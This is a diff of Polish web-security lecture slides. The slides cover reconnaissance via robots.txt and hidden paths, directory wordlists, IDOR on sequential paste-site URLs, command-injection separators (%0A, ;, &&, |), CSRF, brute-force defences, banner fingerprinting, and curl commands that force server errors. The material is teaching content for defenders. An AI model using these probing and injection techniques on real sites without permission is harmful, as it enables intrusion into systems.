 - rozbudowane zapytanie - wielokrotne połączenia dużych tabel,
-  iloczyny kartezjańskie, operator IN dla dużego zbioru, podzapytania, zapytania hierarchiczne
+  iloczyny kartezjańskie, operator IN dla dużego zbioru, podzapytania,
+  zapytania hierarchiczne
 
 - ataki na wildcard-y
 
@@ -1381,6 +1468,39 @@ zamiast
 
 *Podany użytkownik nie istnieje*
 
+** Plik robots.txt
+Plik =robots.tx= wchodzący w skład mechanizmu *Robots Exclusion
+Protocol* może być żródłem informacji o ukrytych zasobach. Niezależnie
+od niego można sprawdzić adresy takie jak:
+
+- test.przykladowa-strona.pl
+- dev.przykladowa-strona.pl
+- old.przykladowa-strona.pl
+- new.przykladowa-strona.pl
+- przykladowa-strona.pl/nowa
+- Google: site:przykladowa-strona.pl
+
+** Przykład pliku robots.txt
+
+#+BEGIN_EXAMPLE
+User-agent: *
+Disallow: /administrator/
+Disallow: /cache/
+Disallow: /components/
+Disallow: /images/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /libraries/
+Disallow: /media/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /templates/
+Disallow: /tmp/
+Disallow: /xmlrpc/
+Disallow: /pliki/
+#+END_EXAMPLE
+
 ** Ukryte zasoby (Forceful browsing)
 Możemy być pewni że atakujący (bądź skrypt którego użyje) będzie
 szukał ukrytych, potencjalnie ciekawych zasobów jak:
@@ -1395,30 +1515,17 @@ szukał ukrytych, potencjalnie ciekawych zasobów jak:
 - =/admin.jsp~=
 - =/admin.jsp.bak=
 
-** Wklej.org - przykład 
+** Lista katalogów OWASP ZAP
+
+Dostępne są gotowe listy nazw zasobów do przeszukania:
+
+https://github.com/zaproxy/zap-extensions/tree/master/src/org/zaproxy/zap/extension/directorylistv2_3/files/fuzzers/dirbuster
+
+największa zawiera ponad 1.2M wpisów
+
 #+BEGIN_EXAMPLE
-http://wklej.org/id/{liczba}/
+index, images, download, 2006, news, crack, serial, warez, full, 12, contact, about, search, spacer, privacy, 11, logo, blog, new, 10, cgi-bin, .git, .svn, .hg, .bzr, faq, rss, home, img, default, 2005, products, sitemap, archives
 #+END_EXAMPLE
-
-#+BEGIN_SRC 
-error_reporting(E_ALL);
-define('API_KEY', 'aa7xxxxx');
-define('API_SECRET', '2adxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');
-define('API_VERSION', 1);
-$SimPayLibs = 'SimPay.class.php';
-#+END_SRC
-
-** Plik robots.txt
-Plik =robots.tx= wchodzący w skład mechanizmu *Robots Exclusion
-Protocol* może być żródłem informacji o ukrytych zasobach. Niezależnie
-od niego można sprawdzić adresy takie jak:
-
-- test.przykladowa-strona.pl
-- dev.przykladowa-strona.pl
-- old.przykladowa-strona.pl
-- new.przykladowa-strona.pl
-- przykladowa-strona.pl/nowa
-- Google: site:przykladowa-strona.pl
 
 ** Insecure Direct Object Reference
 
@@ -1433,6 +1540,19 @@ Przykłady:
 - http://wstaw.org/w/3GVB/ - kolejne znaki  [A-Z0-9]{4}
 - http://etxt.pl - kolejne znaki [a-z0-9]{3}
 - http://wklej.se/ - kolejne liczby
+
+** Wklej.org - przykład 
+#+BEGIN_EXAMPLE
+http://wklej.org/id/{liczba}/
+#+END_EXAMPLE
+
+#+BEGIN_SRC 
+error_reporting(E_ALL);
+define('API_KEY', 'aa7xxxxx');
+define('API_SECRET', '2adxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');
+define('API_VERSION', 1);
+$SimPayLibs = 'SimPay.class.php';
+#+END_SRC
 
 ** Brak walidacji danych
 
@@ -1465,7 +1585,7 @@ uruchamiania komend systemowych wraz z parametrami przekazanymi wraz z
 requestem.
 
 Jak dodawać swoje komendy?
-- nowa linia (%0A)
+- nowa linia (=%0A=)
 - =;=
 - =&&=
 - =|=
@@ -1495,7 +1615,7 @@ atakowanej aplikacji. Najczęściej polega on na podrzuceniu
 spreparowanych linków lub wstrzyknięcie ich do innych serwisów.
 
 Przykładowe cele ataków:
-- zmian danych kontaktowych, hasła itp
+- zmiana danych kontaktowych, hasła itp
 - zamknięcie konta
 - opublikowanie artykułu na forum
 
@@ -1535,7 +1655,7 @@ App --> John: 200 OK Account deleted
 #+END_SRC
 
 #+CAPTION: Scenario of the CSRF attack
-#+ATTR_HTML: :align center
+#+ATTR_HTML: :align center :height 500px
 [[./images/generated-csrf-scenario.png]]
 
 ** CSRF - zapobieganie
@@ -1544,9 +1664,9 @@ App --> John: 200 OK Account deleted
   - Krótkie czasy sesji dla ważnych zasobów
   - Dodatkowa prośba o zalogowanie przed wykonaniem ważnej operacji,
     przejściem do trybu administracyjnego itp.
-  - CSRF token - generując formularz można dodać do niego ukryte pole zawierające
-    losowy tekst lub liczbę, która zostanie potem zweryfikowana z
-    wartością przechowywaną w sesji po stronie serwera
+  - CSRF token - generując formularz można dodać do niego ukryte pole
+    zawierające losowy tekst lub liczbę, która zostanie potem
+    zweryfikowana z wartością przechowywaną w sesji po stronie serwera
   - Wartość weryfikującą można też wpisać w ciasteczku, które w myśl
     "same origin policy" nie jest dostępne dla skryptów z innych
     strony
@@ -1605,12 +1725,45 @@ skuteczność ataków brute-force:
      aplikacji powinno zwrócić komunikat: *Użytkownik lub hasło nie są
      prawidłowe* zamiast *Podany użytkownik nie istnieje*
 
+#+REVEAL: split
+
 - Tymczasowe blokowanie konta :: Zablokowanie konta (także tymczasowe)
      po określonej ilości nieudanych prób w jednostce czasu
 
-- Logowanie i blokowanie adresów :: Jeśli dany adres IP wysyła zbyt dużo nieudanych prób logowania może to być sygnał, że ktoś skanuje z niego naszą aplikację
+- Logowanie i blokowanie adresów :: Jeśli dany adres IP wysyła zbyt
+     dużo nieudanych prób logowania może to być sygnał, że ktoś
+     skanuje z niego naszą aplikację
 
-- Captcha :: Bardzo dobre zabezpieczenie przed atakami słownikowymi na hasło użytkownika, jednakże może prowadzić do ułatwienia znalezienia istniejących użytkowników
+- Captcha :: Bardzo dobre zabezpieczenie przed atakami słownikowymi na
+             hasło użytkownika, jednakże może prowadzić do ułatwienia
+             znalezienia istniejących użytkowników
+
+** Odpowiedzi serwera
+Przeglądając nagłówki HTTP jaki i sekcję META w standardowej
+odpowiedzi serwera:
+
+#+BEGIN_EXAMPLE
+curl -v www.foobar.com
+wget --server-response www.foobar.com
+#+END_EXAMPLE
+
+Można bez wysiłku dostać informacje:
+
+#+BEGIN_EXAMPLE
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze15
+
+Server: Microsoft-IIS/8.5
+X-AspNet-Version: 4.0.30319
+MicrosoftSharePointTeamServices: 16.0.0.5312
+#+END_EXAMPLE
+
+czy też:
+#+BEGIN_EXAMPLE
+<meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+<meta name="generator" content="Incomedia WebSite X5 Professional 12.0.7.26 - www.websitex5.com" />
+<meta name="generator" content="WordPress 4.5.2"/>
+#+END_EXAMPLE
 
 ** Strony błędów
 - Default-owe strony błędów z reguły pokazują dużo informacji
@@ -1623,42 +1776,8 @@ skuteczność ataków brute-force:
 - Pozostawienie domyślnych stron błędów jest bardzo niebezpieczne
 - Strona błędu która wyświetla ładny komunikat ale w komentarzu HTML
   przechowuje dane o błędzie, nie jest rozwiązaniem problemu
-- Stałe frazy z komunikatów błędów mogą zostać użyte jako zapytania w Google hackingu
-
-** Wymuszenie błędów na serwerze
-- =400 Bad Request=
-#+BEGIN_EXAMPLE
-curl -ivs --raw -X POST -H "Content-Length: x" http://www.server.com
-#+END_EXAMPLE
-
-- =404 Not Found=
-#+BEGIN_EXAMPLE
-curl -ivs --raw http://www.server.com/thisPageDoesntExist
-#+END_EXAMPLE
-
-- =403 Forbidden (405 Method Not Allowed)=
-
-#+BEGIN_EXAMPLE
-curl -ivs --raw -X DELETE http://www.server.com/someResource
-#+END_EXAMPLE
-
-#+REVEAL: split
-
-- =408 Request Timeout=
-#+BEGIN_EXAMPLE
-telnet www.server.com 80
-GET / HTTP/1.1
-(wait some time)
-#+END_EXAMPLE
-
-- =500 Internal Server Error=
-#+BEGIN_EXAMPLE
-curl -ivs --raw -X GET http://www.server.com?q=something&page=nonNumber
-#+END_EXAMPLE
-
-#+BEGIN_EXAMPLE
-curl  -ivs --raw http://www.server.com/%
-#+END_EXAMPLE
+- Stałe frazy z komunikatów błędów mogą zostać użyte jako zapytania w
+  Google hackingu
 
 ** Komunikaty o błędach - PHP
 #+BEGIN_EXAMPLE
@@ -1723,6 +1842,41 @@ org.apache.jasper.JasperException: An exception occurred processing JSP
 53:    <a href="<%=path %>/e.view?id=3&xyzId=<%=x.getId() %>">zz3</a> |
 #+END_EXAMPLE
 
+** Wymuszenie błędów na serwerze
+- =400 Bad Request=
+#+BEGIN_EXAMPLE
+curl -ivs --raw -X POST -H "Content-Length: x" http://www.server.com
+#+END_EXAMPLE
+
+- =404 Not Found=
+#+BEGIN_EXAMPLE
+curl -ivs --raw http://www.server.com/thisPageDoesntExist
+#+END_EXAMPLE
+
+- =403 Forbidden (405 Method Not Allowed)=
+
+#+BEGIN_EXAMPLE
+curl -ivs --raw -X DELETE http://www.server.com/someResource
+#+END_EXAMPLE
+
+#+REVEAL: split
+
+- =408 Request Timeout=
+#+BEGIN_EXAMPLE
+telnet www.server.com 80
+GET / HTTP/1.1
+(wait some time)
+#+END_EXAMPLE
+
+- =500 Internal Server Error=
+#+BEGIN_EXAMPLE
+curl -ivs --raw -X GET http://www.server.com?q=something&page=nonNumber
+#+END_EXAMPLE
+
+#+BEGIN_EXAMPLE
+curl  -ivs --raw http://www.server.com/%
+#+END_EXAMPLE
+
 ** Biblioteki Access Control
 - Spring Security (http://projects.spring.io/spring-security/) :: authentication,
      authorization, security mechanisms (SF, CJ, CSRF etc.), OAUTH
@@ -1758,22 +1912,32 @@ A part
 #+END_EXAMPLE
 
 ** Zastosowanie
-CAPTCHA-e mają szerokie zastosowanie przy poprawie różnych aspektów bezpieczeństwa aplikacji. Pomagają zapobiegać:
+CAPTCHA-e mają szerokie zastosowanie przy poprawie różnych aspektów
+bezpieczeństwa aplikacji. Pomagają zapobiegać:
 - atakom słownikom przy formularzach logowania i odzyskiwania hasła
 - spamowaniu na blogach i forach
-- wykorzystaniu naszych zasobów przez skrypty czy backend-y innych aplikacji (formularze ubezpieczeniowe, usługi typu whois, bramki sms)
-- limitowanie ruchu w naszych usługach (za duża ilość maili wysłana z jednego adresu)
+- wykorzystaniu naszych zasobów przez skrypty czy backend-y innych
+  aplikacji (formularze ubezpieczeniowe, usługi typu whois, bramki
+  sms)
+- limitowanie ruchu w naszych usługach (za duża ilość maili wysłana z
+  jednego adresu)
 - automatom które chciałyby wpłynąć na sondy, głosowania, wybory
 - robotom które chcą się rejestrować na forach, tworzyć maile itp
   
 ** Typy
 - Tekstowe :: Przepisz tekst z obrazka lub zdjęcia
-- Zadanie :: Rozwiąż proste równanie (12-7=?) lub powiedz jaka pora roku jest po zimie
+- Zadanie :: Rozwiąż proste równanie (12-7=?) lub powiedz jaka pora
+             roku jest po zimie
 - Audio :: wpisz tekst z pliku dźwiękowego
+
+#+REVEAL: split
+
 - Graficzne :: Wskaż kota na obrazku, ustaw suwak filtra graficznego w
                miejscu gdzie obraz jest najmniej zniekształcony
 - Video :: Przepisz animowany tekst
-- Skryptowe :: Działają w przeglądarce, proszą o wykonanie prostej akcji (przeciągnij kwadrat na zielone pole), jednocześnie analizując ruch myszy
+- Skryptowe :: Działają w przeglądarce, proszą o wykonanie prostej
+               akcji (przeciągnij kwadrat na zielone pole),
+               jednocześnie analizując ruch myszy
 
 ** Ataki na CAPTCHA-e
 - Słabość konkretnej implementacji :: Niektóre implementacje CAPTCHA
@@ -1781,14 +1945,17 @@ CAPTCHA-e mają szerokie zastosowanie przy poprawie różnych aspektów bezpiecz
   - brak losowości, zbudowanie słownika testów (np obrazków) z
     przypisanymi na stałe rozwiązaniami i captchaID
   - skończona ilość rozwiązań (baza testów)
-  - zbyt proste rozwiązania (za mała ilość znaków) lub rozwiązania są wyrazami ze słownika
-  - możliwość wielokrotnego użycia sesji w którym raz poprawnie rozwiązano CAPTCHA-ę
+  - zbyt proste rozwiązania (za mała ilość znaków) lub rozwiązania są
+    wyrazami ze słownika
+  - możliwość wielokrotnego użycia sesji w którym raz poprawnie
+    rozwiązano CAPTCHA-ę
   - captcha-e generowane po stronie klienta - mimo, że walidowane po
     stronie serwera, to można podejrzeć dane na podstawie których
     generowały testowy obrazek
   - walidacja po stronie klienta, nawet jeśli rozwiązanie jest podane
     jako hash (MD5)
-  - przekazywanie dodatkowych parametrów które mogą wskazywać na rozwiązanie
+  - przekazywanie dodatkowych parametrów które mogą wskazywać na
+    rozwiązanie
 
 #+REVEAL: split
 
@@ -1851,5 +2018,4 @@ pochodzące od spam-botów ("captcha bez captcha-y").
 - http://sekurak.pl
 - https://zaufanatrzeciastrona.pl/
 - http://www.html5rocks.com/en/tutorials/security/content-security-policy/
-
 - https://haveibeenpwned.com/
